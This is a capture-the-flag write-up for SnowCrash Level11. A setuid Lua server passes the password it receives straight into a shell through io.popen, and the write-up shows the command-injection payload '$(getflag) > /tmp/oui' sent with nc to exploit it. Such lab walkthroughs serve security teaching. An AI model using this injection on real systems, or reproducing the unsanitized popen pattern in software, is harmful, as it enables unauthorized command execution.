# Level11

## Research

```bash
level11@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
```

Study `level11.lua`:
```lua
#!/usr/bin/env lua
local socket = require("socket")
-- bind() associates the socket with its local address [that's why server side binds, 
-- so that clients can use that address to connect to server.] connect() is used to 
-- connect to a remote [server] address, that's why is client side, connect [read as: 
-- connect to server] is used.
local server = assert(socket.bind("127.0.0.1", 5151))

-- Seems to hash a password then return hash
function hash(pass)
  -- io.popen : 
  -- open a process that you can read from (mode 'r') OR write to (mode 'w') 
  -- through standard pipes (stdin, stdout)
  -- starts program prog in a separated process and returns a file handle that you 
  -- can use to read data from this program (if mode is "r", the default) or to write 
  -- data to this program (if mode is "w"). 
  -- sha1sum is a computer program that calculates and verifies SHA-1 hashes. t print or check 
  -- SHA1 (160-bit) checksums. With no FILE, or when FILE is -, read standard input. 
  -- A checksum (or hash) is a sequence of numbers and letters used to check data for errors. If you know the checksum
  -- of an original file, you can use a checksum utility to confirm your copy is identical.
  -- To produce a checksum, you run a program that puts that file through an algorithm. Typical algorithms 
  -- used for this include MD5, SHA-1, SHA-256, and SHA-512.
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  -- read("*all") reads the whole current input file
  data = prog:read("*all")
  prog:close()
  -- takes a part of data and return it
  data = string.sub(data, 1, 40)
  return data
end

while 1 do
    local client = server:accept()
    client:send("Password: ")
    client:settimeout(60)
    -- err is error string if something went wrong (like timeout)
    -- l is the return of receive(), surely the strings the client entered aka password
    local l, err = client:receive()
  if not err then
      print("trying " .. l)
      --   sends client's attempted password to hash function
      local h = hash(l)
      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end
  end
  client:close()
end
```


A server seems to be server set up on our localhost on port 5151. It will ask for a passord, will sends this password in a hash function, will apply a sha1sum on it, will return the 40 first characters of it, and will do a useless `if else` condition.

`prog = io.popen("echo "..pass.." | sha1sum", "r")` </br>
`The popen() function opens a process by creating a pipe, forking, and invoking the shell.`</br>
https://linux.die.net/man/3/popen</br>

popen is known for its vunerability to command injections, as it will execute code (see below). </br>
https://www.stigviewer.com/stig/application_security_and_development/2018-12-24/finding/V-70261

So io.popen starts a program in a separated process and returns a file handle that you can use to read data from this program or to write data to this program.

So the program level11.lua will execute `echo "..pass.." | sha1sum`. We saw in a previous level that echo with double quote will execute any command which is written like this `$(command)`.


## Solution

So we should listen to the port 5151: </br>
`nc localhost 5151`</br>
`Password: $(getflag)`</br>
don't return the flag.

Maybe on a different file: </br>
`nc localhost 5151`</br>
`Password: $(getflag) > /tmp/oui`</br>
`cat /tmp/oui` gives us the flag.
